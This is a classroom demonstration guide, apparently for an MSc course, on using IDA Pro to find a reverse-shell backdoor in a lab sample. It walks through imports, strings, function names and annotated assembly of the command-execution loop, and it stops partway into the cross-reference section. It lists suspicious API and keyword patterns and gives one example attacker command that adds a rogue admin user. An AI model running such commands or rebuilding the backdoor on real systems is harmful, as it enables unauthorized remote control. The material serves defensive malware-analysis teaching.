================================================================================
          STEP-BY-STEP IDA PRO DEMONSTRATION GUIDE
        Detecting Backdoors in Compiled Binaries
            For MSc Cybersecurity Students
================================================================================

TABLE OF CONTENTS
=================
1. Introduction and Setup
2. Loading the Binary in IDA Pro
3. Step 1: Import Analysis
4. Step 2: String Analysis
5. Step 3: Function List Analysis
6. Step 4: Graph View Analysis
7. Step 5: Cross-Reference Analysis
8. Step 6: Identifying Malicious Behavior
9. Step 7: Creating Detection Signatures
10. Conclusion and Q&A

================================================================================
SECTION 1: INTRODUCTION AND SETUP
================================================================================

LEARNING OBJECTIVES:
--------------------
By the end of this demonstration, students will be able to:
â€¢ Navigate IDA Pro interface effectively
â€¢ Identify malicious functions in compiled binaries
â€¢ Recognize backdoor patterns and behaviors
â€¢ Create indicators of compromise (IOCs)
â€¢ Understand static malware analysis methodology

PREREQUISITES:
--------------
âœ“ IDA Pro installed (located at: D:\Forensics\)
âœ“ Sample file: simple_backdoor_debug.exe
âœ“ Windows virtual machine (isolated lab environment)
âœ“ Basic understanding of networking concepts
âœ“ Familiarity with assembly language (helpful but not required)

SAFETY WARNINGS:
----------------
âš  This is REAL malware created for educational purposes
âš  ONLY run in isolated lab environment
âš  Do NOT connect to the internet during analysis
âš  Do NOT copy to personal devices
âš  Do NOT modify or run without supervision

WHAT WE'RE ANALYZING:
---------------------
File Name: simple_backdoor_debug.exe
Type: Reverse shell backdoor
Purpose: Demonstrates how attackers gain remote access to systems
Behavior: Connects to remote IP, receives commands, executes them, sends results back

================================================================================
SECTION 2: LOADING THE BINARY IN IDA PRO
================================================================================

STEP 2.1: LAUNCH IDA PRO
------------------------
1. Navigate to: D:\Forensics\
2. Double-click "IDA Pro" icon or executable
3. Wait for IDA Pro to fully load (splash screen will appear)

[INSTRUCTOR NOTE: Show students the IDA Pro loading screen]

STEP 2.2: OPEN THE BINARY
--------------------------
1. Click: File â†’ Open (or press Ctrl+F6)
2. Browse to: C:\Users\nwcla\Desktop\IDA-Py\
3. Select: simple_backdoor_debug.exe
4. Click "Open"

STEP 2.3: CONFIGURE PROCESSOR TYPE
-----------------------------------
A dialog will appear asking about the file type.

For this sample:
â€¢ File type: PE (Portable Executable)
â€¢ Processor: x86 or x86-64 (depending on your compilation)
â€¢ Click "OK" to continue

[INSTRUCTOR NOTE: Explain what PE format means - Windows executable]

STEP 2.4: WAIT FOR AUTO-ANALYSIS
---------------------------------
IDA Pro will now automatically analyze the binary.

WHAT TO WATCH:
â€¢ Progress bar at bottom of screen
â€¢ Status messages showing analysis progress
â€¢ Wait until you see "Auto analysis complete" or progress bar reaches 100%

â± This usually takes 10-60 seconds depending on file size

[INSTRUCTOR NOTE: Explain that IDA is identifying functions, data structures,
and code patterns automatically]

STEP 2.5: FAMILIARIZE WITH THE INTERFACE
-----------------------------------------
Once loaded, you'll see several windows:

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  IDA Pro Main Interface                                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  Functions  â”‚  â”‚     Disassembly View            â”‚  â”‚
â”‚  â”‚  Window     â”‚  â”‚  (Assembly code)                â”‚  â”‚
â”‚  â”‚             â”‚  â”‚                                 â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚          Hex View (Raw bytes)                    â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

KEY WINDOWS:
â€¢ Disassembly View: Shows assembly code
â€¢ Functions Window: Lists all identified functions
â€¢ Hex View: Shows raw bytes
â€¢ Imports Window: External functions used
â€¢ Strings Window: Text strings found in the binary

================================================================================
SECTION 3: STEP 1 - IMPORT ANALYSIS (FINDING SUSPICIOUS APIs)
================================================================================

CONCEPT:
--------
When malware wants to perform actions (network communication, file operations,
process creation), it must import functions from Windows DLLs. By examining
which functions are imported, we can understand the malware's capabilities.

STEP 3.1: OPEN THE IMPORTS WINDOW
----------------------------------
Method 1: Press Ctrl+I (shortcut)
Method 2: Click: View â†’ Open subviews â†’ Imports

[INSTRUCTOR NOTE: Show both methods on screen]

STEP 3.2: EXAMINE THE IMPORTS LIST
-----------------------------------
You will see a list of DLLs and their imported functions.

Look for these SUSPICIOUS categories:

ğŸš© NETWORKING FUNCTIONS (from ws2_32.dll):
   â€¢ WSAStartup    - Initialize networking
   â€¢ socket        - Create network socket
   â€¢ connect       - Connect to remote host â† RED FLAG!
   â€¢ send          - Send data over network
   â€¢ recv          - Receive data from network
   â€¢ bind          - Bind to port (for servers)
   â€¢ listen        - Listen for connections
   â€¢ accept        - Accept incoming connections

ğŸš© COMMAND EXECUTION FUNCTIONS (from msvcrt.dll or kernel32.dll):
   â€¢ system        - Execute shell command â† CRITICAL!
   â€¢ _popen        - Open pipe to command â† CRITICAL!
   â€¢ WinExec       - Execute program â† CRITICAL!
   â€¢ CreateProcess - Create new process â† CRITICAL!
   â€¢ ShellExecute  - Execute with shell â† CRITICAL!

ğŸš© REGISTRY/PERSISTENCE FUNCTIONS (from advapi32.dll):
   â€¢ RegCreateKey  - Create registry key â† Persistence!
   â€¢ RegSetValue   - Modify registry â† Persistence!
   â€¢ RegOpenKey    - Open registry key

ğŸš© FILE OPERATIONS (from kernel32.dll):
   â€¢ CreateFile    - Create/open file
   â€¢ WriteFile     - Write to file
   â€¢ ReadFile      - Read from file
   â€¢ CopyFile      - Copy file
   â€¢ DeleteFile    - Delete file

STEP 3.3: DEMONSTRATE THE ANALYSIS
-----------------------------------
[INSTRUCTOR: Point to each import on screen and explain]

"Class, I want you to open the Imports window now. Press Ctrl+I."

[PAUSE - Wait for students to open the window]

"Now, look at the ws2_32.dll section. What do you see?"

EXPECTED STUDENT ANSWERS:
â€¢ WSAStartup
â€¢ socket
â€¢ connect  â† Emphasize this one!
â€¢ send
â€¢ recv

[INSTRUCTOR SAY]:
"The presence of 'connect' is a major red flag. This means the malware
initiates an OUTBOUND connection to a remote server. This is characteristic
of a REVERSE SHELL."

"Now scroll down and look for command execution functions. Do you see _popen?"

[PAUSE for student responses]

"Yes! _popen allows the program to execute shell commands. The combination of:
  NETWORKING (connect, send, recv)
  +
  COMMAND EXECUTION (_popen)
  =
  BACKDOOR!"

STEP 3.4: DOCUMENT THE FINDINGS
--------------------------------
[INSTRUCTOR: Write on whiteboard or projection]

IOC #1: Suspicious Imports
---------------------------
DLL: ws2_32.dll
Functions: WSAStartup, socket, connect, send, recv
Indicator: Outbound network capability

DLL: msvcrt.dll
Function: _popen
Indicator: Command execution capability

ASSESSMENT: HIGH RISK - Backdoor behavior detected

STEP 3.5: STUDENT EXERCISE
---------------------------
[Give students 3 minutes]

"Now, everyone write down:
1. The name of the DLL that contains networking functions
2. Which function indicates OUTBOUND connection?
3. Which function executes commands?"

[Walk around and check student answers]

================================================================================
SECTION 4: STEP 2 - STRING ANALYSIS (FINDING CLUES)
================================================================================

CONCEPT:
--------
Malware often contains strings that reveal its behavior: IP addresses, URLs,
file paths, commands, error messages, etc. String analysis is one of the
fastest ways to understand what malware does.

STEP 4.1: OPEN THE STRINGS WINDOW
----------------------------------
Method 1: Press Shift+F12 (shortcut - fastest!)
Method 2: Click: View â†’ Open subviews â†’ Strings

[INSTRUCTOR NOTE: Use Shift+F12 and show the shortcut on screen]

STEP 4.2: CONFIGURE STRING DISPLAY (Optional)
----------------------------------------------
If you see too many strings, you can filter:
1. Right-click in the Strings window
2. Select "Setup..."
3. Adjust:
   â€¢ Minimum length: 5 characters
   â€¢ String types: C-style and Unicode
4. Click "OK"

STEP 4.3: LOOK FOR SUSPICIOUS STRINGS
--------------------------------------
Scroll through the strings and look for:

ğŸ” NETWORK INDICATORS:
   â€¢ IP addresses (xxx.xxx.xxx.xxx)
   â€¢ Domain names (example.com)
   â€¢ URLs (http://...)
   â€¢ Port numbers

ğŸ” COMMAND INDICATORS:
   â€¢ "cmd", "cmd.exe", "powershell"
   â€¢ "shell", "bash"
   â€¢ "exec", "execute"
   â€¢ "system", "command"

ğŸ” FUNCTIONAL STRINGS:
   â€¢ Error messages ("Failed to connect")
   â€¢ Status messages ("Connected successfully")
   â€¢ Debug strings ("Connecting to...")

ğŸ” MALICIOUS KEYWORDS:
   â€¢ "backdoor", "rootkit", "keylog"
   â€¢ "inject", "exploit"
   â€¢ "hide", "stealth"

STEP 4.4: DEMONSTRATE FINDINGS IN OUR SAMPLE
---------------------------------------------
[INSTRUCTOR: Show the Strings window on projector]

"Class, I've opened the Strings window. Let's look for suspicious strings together."

[Scroll slowly through the list]

"Here's what I found - can anyone else see these?"

FOUND STRINGS:
--------------
âœ“ "Initializing Winsock..."     â† Networking activity!
âœ“ "Socket created"               â† Creating network socket
âœ“ "Connecting to %s:%d"          â† Connecting to IP:Port!
âœ“ "Connected!"                   â† Connection successful
âœ“ "Received command: %s"         â† Receiving commands! RED FLAG!
âœ“ "Connection failed"            â† Error handling
âœ“ "127.0.0.1"                    â† IP ADDRESS! (localhost for safety)
âœ“ "exit"                         â† Command keyword

[INSTRUCTOR SAY]:
"Look at this string: 'Received command: %s'"

"The %s is a format specifier - it means the program is receiving a string
(probably from the network) and treating it as a COMMAND. This is extremely
suspicious!"

STEP 4.5: CROSS-REFERENCE A STRING
-----------------------------------
[INSTRUCTOR: Demonstrate this technique]

"Now I'm going to show you a powerful technique: finding WHERE a string is used."

1. Double-click on the string "Received command: %s"
   â†’ This jumps to the string's location in the disassembly

2. Press X (cross-reference shortcut)
   â†’ A window appears showing where this string is referenced

3. Double-click on the reference
   â†’ Jumps to the CODE that uses this string!

[INSTRUCTOR NOTE: Show the assembly code around the string reference]

"See? Now we're in the function that receives and processes commands.
This is the heart of the backdoor!"

STEP 4.6: DOCUMENT THE FINDINGS
--------------------------------
[INSTRUCTOR: Add to whiteboard]

IOC #2: Suspicious Strings
---------------------------
Network indicators:
â€¢ Target IP: 127.0.0.1 (localhost)
â€¢ Connection strings present
â€¢ Command reception confirmed

String evidence:
â€¢ "Received command: %s" â† CRITICAL
â€¢ "Connecting to %s:%d"

ASSESSMENT: Confirms backdoor behavior

STEP 4.7: STUDENT EXERCISE
---------------------------
[Give students 5 minutes]

"Your turn! Find and write down:
1. The IP address the backdoor connects to
2. Any strings related to command execution
3. Any error messages you see

Use Shift+F12 to open Strings window, then use Ctrl+F to search."

[Walk around and assist students]

================================================================================
SECTION 5: STEP 3 - FUNCTION LIST ANALYSIS
================================================================================

CONCEPT:
--------
IDA Pro identifies functions in the binary and often generates names based on
analysis. Function names can reveal suspicious behavior even before analyzing
the code.

STEP 5.1: OPEN THE FUNCTIONS WINDOW
------------------------------------
Method 1: Press Shift+F3 (shortcut)
Method 2: Click: View â†’ Open subviews â†’ Functions

[INSTRUCTOR: Show the Functions window on screen]

STEP 5.2: UNDERSTAND FUNCTION NAMING
-------------------------------------
IDA Pro shows different types of function names:

â€¢ Library functions: Imported from DLLs (WSAStartup, printf, etc.)
â€¢ Named functions: IDA identified from debug symbols or exports
â€¢ sub_XXXXXX: Unnamed functions (IDA creates placeholder names)

In our debug build, we have REAL function names because we compiled with -g flag!

STEP 5.3: SORT AND SCAN FUNCTIONS
----------------------------------
1. Click on the "Name" column header to sort alphabetically
2. Scroll through the list
3. Look for suspicious keywords

ğŸ” SUSPICIOUS FUNCTION NAME PATTERNS:
   â€¢ Contains: "connect", "socket", "net", "http"
   â€¢ Contains: "shell", "cmd", "exec", "command"
   â€¢ Contains: "backdoor", "trojan", "rat" (rarely this obvious!)
   â€¢ Contains: "install", "persist", "hide", "inject"
   â€¢ Contains: "decode", "decrypt", "unpack", "xor"

STEP 5.4: IDENTIFY MALICIOUS FUNCTIONS IN OUR SAMPLE
-----------------------------------------------------
[INSTRUCTOR: Show and highlight these functions]

FOUND FUNCTIONS:
----------------
âœ“ main
   â†’ Entry point (normal)

âœ“ check_system_updates
   â†’ Looks innocent, but might be decoy

âœ“ decode_string  â† SUSPICIOUS!
   â†’ Why does it need to decode strings?
   â†’ Probably obfuscation!

âœ“ establish_connection  â† VERY SUSPICIOUS!
   â†’ Clear malicious intent
   â†’ Establishes network connection

âœ“ install_persistence  â† EXTREMELY SUSPICIOUS!
   â†’ Attempts to remain on system after reboot
   â†’ This is RED FLAG for malware!

[INSTRUCTOR SAY]:
"Look at these function names! The developer actually named them honestly -
'establish_connection' and 'install_persistence'. In real malware, attackers
try to hide these with names like 'check_updates' or 'system_service', but the
BEHAVIOR is the same."

STEP 5.5: NAVIGATE TO A SUSPICIOUS FUNCTION
--------------------------------------------
[INSTRUCTOR: Demonstrate navigation]

1. Double-click on "establish_connection" in the Functions list
   â†’ IDA jumps to that function in the Disassembly view

2. Press Spacebar
   â†’ Switches to Graph View (visual flow chart)

[INSTRUCTOR NOTE: Don't analyze the function yet - that's next section]

"We'll analyze this function in detail shortly. For now, just observe that
it has many basic blocks and control flow - it's doing something complex."

STEP 5.6: DOCUMENT THE FINDINGS
--------------------------------
[INSTRUCTOR: Add to whiteboard]

IOC #3: Suspicious Functions
-----------------------------
Functions identified:
â€¢ decode_string()           â† Obfuscation
â€¢ establish_connection()    â† Network backdoor
â€¢ install_persistence()     â† Persistence mechanism

ASSESSMENT: Multiple malicious capabilities confirmed

STEP 5.7: STUDENT EXERCISE
---------------------------
[Give students 3 minutes]

"Open the Functions window (Shift+F3) and:
1. Find 'establish_connection' function
2. Double-click to jump to it
3. Press Spacebar to see the graph view
4. Count how many 'blocks' (rectangles) you see"

[This prepares them for the next section]

================================================================================
SECTION 6: STEP 4 - GRAPH VIEW ANALYSIS (THE VISUAL APPROACH)
================================================================================

CONCEPT:
--------
Graph View is IDA Pro's most powerful feature for understanding program flow.
It shows code as a flowchart where:
â€¢ Rectangles (basic blocks) = sequential instructions
â€¢ Arrows = flow of execution
â€¢ Green arrows = condition TRUE
â€¢ Red arrows = condition FALSE

This section is the CORE of the demonstration!

STEP 6.1: ENSURE YOU'RE IN THE RIGHT FUNCTION
----------------------------------------------
Make sure you're viewing: establish_connection

If not:
1. Press Shift+F3 (Functions window)
2. Double-click "establish_connection"

STEP 6.2: SWITCH TO GRAPH VIEW
-------------------------------
Press Spacebar to toggle between Text View and Graph View

You should now see a flowchart-like diagram!

[INSTRUCTOR NOTE: Make sure graph is visible on projector]

STEP 6.3: NAVIGATE THE GRAPH
-----------------------------
Mouse controls:
â€¢ Scroll wheel: Zoom in/out
â€¢ Middle mouse button + drag: Pan around
â€¢ Double-click block: See detailed instructions
â€¢ Press '-' (minus): Zoom to fit entire function

[INSTRUCTOR: Demonstrate each control]

STEP 6.4: UNDERSTAND BASIC BLOCKS
----------------------------------
[INSTRUCTOR: Point to a rectangular block on screen]

"Each rectangle is called a 'basic block' - a sequence of instructions that
execute one after another with no branching."

Example block might contain:
   push ebp
   mov ebp, esp
   sub esp, 40h
   call WSAStartup

"These four instructions always execute together."

STEP 6.5: IDENTIFY THE BACKDOOR PATTERN - ENTRY BLOCK
------------------------------------------------------
[INSTRUCTOR: Scroll to the top of the graph]

"Let's trace the execution flow together. The first block is the function entry:"

BLOCK 1 - Function Prologue:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ push    ebp                 â”‚  â† Save stack frame
â”‚ mov     ebp, esp            â”‚  â† Set up new frame
â”‚ sub     esp, XXh            â”‚  â† Allocate local variables
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â–¼

"This is standard function setup code - nothing suspicious yet."

STEP 6.6: IDENTIFY THE BACKDOOR PATTERN - WINSOCK INITIALIZATION
-----------------------------------------------------------------
[INSTRUCTOR: Move to next block]

BLOCK 2 - Initialize Networking:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ lea     eax, [ebp+var_XX]   â”‚  â† Load address of WSADATA struct
â”‚ push    eax                 â”‚  â† Pass to WSAStartup
â”‚ push    202h                â”‚  â† Version 2.2
â”‚ call    WSAStartup          â”‚  â† Initialize Winsock library!
â”‚ test    eax, eax            â”‚  â† Check return value
â”‚ jnz     error_block         â”‚  â† Jump if error
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚ (Success)
             â–¼

[INSTRUCTOR SAY]:
"Here's the first clear sign of network activity! WSAStartup initializes
Windows networking. Every network program must call this, but it's especially
interesting when combined with what comes next..."

STEP 6.7: IDENTIFY THE BACKDOOR PATTERN - SOCKET CREATION
----------------------------------------------------------
[INSTRUCTOR: Move to next block]

BLOCK 3 - Create Socket:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ push    0                   â”‚  â† Protocol (0 = default)
â”‚ push    1                   â”‚  â† Type: SOCK_STREAM (TCP!)
â”‚ push    2                   â”‚  â† Family: AF_INET (IPv4)
â”‚ call    socket              â”‚  â† Create socket!
â”‚ mov     [ebp+var_sock], eax â”‚  â† Save socket handle
â”‚ cmp     eax, 0FFFFFFFFh     â”‚  â† Check if INVALID_SOCKET
â”‚ jz      error_block         â”‚  â† Jump if error
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚ (Success)
             â–¼

[INSTRUCTOR SAY]:
"Now we're creating a TCP socket. TCP is reliable, connection-oriented protocol -
perfect for a backdoor that needs to reliably receive and execute commands."

STEP 6.8: IDENTIFY THE BACKDOOR PATTERN - CONNECT (CRITICAL!)
--------------------------------------------------------------
[INSTRUCTOR: Move to next block - THIS IS THE KEY BLOCK!]

BLOCK 4 - Connect to Remote Host:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ mov     [ebp+server.sin_family], 2       â”‚  â† AF_INET
â”‚ mov     eax, [ebp+ip_addr]               â”‚  â† Load IP address
â”‚ mov     [ebp+server.sin_addr], eax       â”‚  â† Set target IP
â”‚ mov     ax, [ebp+port_num]               â”‚  â† Load port number
â”‚ call    htons                             â”‚  â† Convert to network byte order
â”‚ mov     [ebp+server.sin_port], ax        â”‚  â† Set target port
â”‚ push    10h                               â”‚  â† sizeof(sockaddr_in)
â”‚ lea     eax, [ebp+server]                 â”‚  â† Address of server struct
â”‚ push    eax                               â”‚  â† Pass server struct
â”‚ push    [ebp+var_sock]                    â”‚  â† Pass socket
â”‚ call    connect                           â”‚  â† CONNECT TO ATTACKER!
â”‚ test    eax, eax                          â”‚  â† Check if successful
â”‚ jl      connection_failed                 â”‚  â† Jump if failed
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚ (Connected!)
             â–¼

[INSTRUCTOR SAY - EMPHASIZE THIS]:
"THIS IS THE SMOKING GUN!"

"The 'connect' call means this is a REVERSE SHELL - the malware reaches OUT
to the attacker's server. This is different from a 'bind shell' which would
use 'bind' and 'listen' to wait for incoming connections."

"Why do attackers prefer reverse shells?"
[Ask students - wait for answers]

ANSWER:
"Because firewalls typically block INCOMING connections but allow OUTGOING ones!
By connecting OUT, the malware bypasses most firewall rules!"

STEP 6.9: IDENTIFY THE BACKDOOR PATTERN - COMMAND LOOP (CRITICAL!)
-------------------------------------------------------------------
[INSTRUCTOR: Scroll to the main loop]

BLOCK 5 - Receive Commands:
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
   â”Œâ”€â”€â”€â†’â”‚ push    200h                â”‚  â† Buffer size (512 bytes)
   â”‚    â”‚ lea     eax, [ebp+recvbuf]  â”‚  â† Address of receive buffer
   â”‚    â”‚ push    eax                 â”‚  â† Pass buffer
   â”‚    â”‚ push    0                   â”‚  â† Flags
   â”‚    â”‚ push    [ebp+var_sock]      â”‚  â† Pass socket
   â”‚    â”‚ call    recv                â”‚  â† RECEIVE DATA FROM ATTACKER!
   â”‚    â”‚ mov     [ebp+recv_size], eaxâ”‚  â† Save number of bytes received
   â”‚    â”‚ cmp     eax, 0              â”‚  â† Check if connection closed
   â”‚    â”‚ jle     exit_loop           â”‚  â† Exit if no data or error
   â”‚    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
   â”‚                 â”‚
   â”‚                 â–¼
   â”‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
   â”‚    â”‚ lea     eax, [ebp+recvbuf]  â”‚  â† Get received data
   â”‚    â”‚ push    offset "exit"       â”‚  â† Compare against "exit"
   â”‚    â”‚ push    eax                 â”‚
   â”‚    â”‚ call    strncmp             â”‚  â† Check if command is "exit"
   â”‚    â”‚ test    eax, eax            â”‚
   â”‚    â”‚ jz      exit_loop           â”‚  â† Exit loop if "exit" received
   â”‚    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
   â”‚                 â”‚
   â”‚                 â–¼
   â”‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
   â”‚    â”‚ lea     eax, [ebp+recvbuf]  â”‚  â† Get the command
   â”‚    â”‚ push    offset "r"          â”‚  â† Open for reading
   â”‚    â”‚ push    eax                 â”‚  â† Pass command string
   â”‚    â”‚ call    _popen              â”‚  â† EXECUTE THE COMMAND!!!
   â”‚    â”‚ mov     [ebp+fp], eax       â”‚  â† Save file pointer
   â”‚    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
   â”‚                 â”‚
   â”‚                 â–¼
   â”‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
   â”‚    â”‚ push    [ebp+fp]            â”‚  â† File pointer
   â”‚    â”‚ push    400h                â”‚  â† Result buffer size
   â”‚    â”‚ lea     eax, [ebp+result]   â”‚  â† Result buffer
   â”‚    â”‚ push    eax                 â”‚
   â”‚    â”‚ call    fgets               â”‚  â† Read command output
   â”‚    â”‚ test    eax, eax            â”‚  â† Check if more data
   â”‚    â”‚ jz      done_reading        â”‚  â† No more output
   â”‚    â”‚ push    0                   â”‚  â† Flags
   â”‚    â”‚ push    [ebp+result_len]    â”‚  â† Length of result
   â”‚    â”‚ lea     eax, [ebp+result]   â”‚  â† Result buffer
   â”‚    â”‚ push    eax                 â”‚
   â”‚    â”‚ push    [ebp+var_sock]      â”‚  â† Socket
   â”‚    â”‚ call    send                â”‚  â† SEND RESULTS BACK!
   â”‚    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
   â”‚                 â”‚
   â”‚                 â–¼
   â”‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
   â”‚    â”‚ push    [ebp+fp]            â”‚
   â”‚    â”‚ call    _pclose             â”‚  â† Close pipe
   â”‚    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
   â”‚                 â”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â† LOOP BACK TO RECV!

[INSTRUCTOR SAY - THIS IS THE MOST IMPORTANT PART]:
"Class, pay very close attention to this flow!"

[Trace with your finger or laser pointer]:
1. "First, recv() waits for data from the attacker"
2. "The data goes into recvbuf"
3. "It checks if the command is 'exit' - if yes, the loop ends"
4. "If not, look what happens: the data goes DIRECTLY to _popen!"
5. "_popen() EXECUTES whatever command was received!"
6. "The output is read with fgets()"
7. "The output is sent BACK to the attacker with send()"
8. "Then it loops back to recv() and waits for the next command!"

[PAUSE]

"Do you see what's missing here?"
[Wait for student responses]

"There's NO VALIDATION! Whatever the attacker sends gets executed immediately!"

"The attacker could send:
â€¢ 'dir' - see all files
â€¢ 'whoami' - see what user the malware is running as
â€¢ 'ipconfig' - get network information
â€¢ 'net user hacker password123 /add' - create a new admin user!
â€¢ Literally ANY Windows command!"

"This is a full remote shell - the attacker has complete control!"

STEP 6.10: VISUALIZE THE LOOP STRUCTURE
----------------------------------------
[INSTRUCTOR: Point out the back-edge]

"See this arrow going UPWARD from the bottom back to the recv() block?"

"This is called a 'back-edge' - it indicates a LOOP."

"The backdoor will keep receiving and executing commands FOREVER until:
 1. The attacker sends 'exit' command
 2. The network connection breaks
 3. The process is killed"

STEP 6.11: DOCUMENT THE FINDINGS
---------------------------------
[INSTRUCTOR: Add to whiteboard]

IOC #4: Malicious Control Flow
-------------------------------
Pattern detected: Reverse Shell Command Loop

Flow:
1. Initialize Winsock (WSAStartup)
2. Create TCP socket
3. Connect to remote host (OUTBOUND!)
4. Loop:
   a. Receive command (recv)
   b. Check for "exit"
   c. Execute command (_popen) â† NO VALIDATION!
   d. Send results back (send)
   e. Repeat

ASSESSMENT: CRITICAL - Full remote command execution capability

STEP 6.12: STUDENT EXERCISE
----------------------------
[Give students 10 minutes]

"Now it's your turn! Open the establish_connection function in Graph View and:

1. Find the recv() call - mark it on your worksheet
2. Find the _popen() call - mark it
3. Draw arrows showing the flow from recv to _popen to send
4. Identify the loop (where does it go back to?)
5. BONUS: What happens if recv() returns 0 or negative? (Connection closed)"

[Walk around and assist students - this is complex!]

================================================================================
SECTION 7: STEP 5 - CROSS-REFERENCE ANALYSIS
================================================================================

CONCEPT:
--------
Cross-reference analysis shows WHERE and HOW functions are called throughout
the program. This helps understand the relationship between different parts
of the malware.

STEP 7.1: UNDERSTAND CROSS-REFERENCES
--------------------------------------
Types of cross-references:
â€¢ Code references (calls): Function A calls Function B
â€¢ Data references (reads/writes): Code accesses a variable or string
â€¢ Up references: Who calls THIS function?
â€¢ Down references: What does THIS function call?

STEP 7.2: FIND ALL CALLS TO A DANGEROUS FUNCTION
-------------------------------------------------
[INSTRUCTOR: Demonstrate this powerful technique]

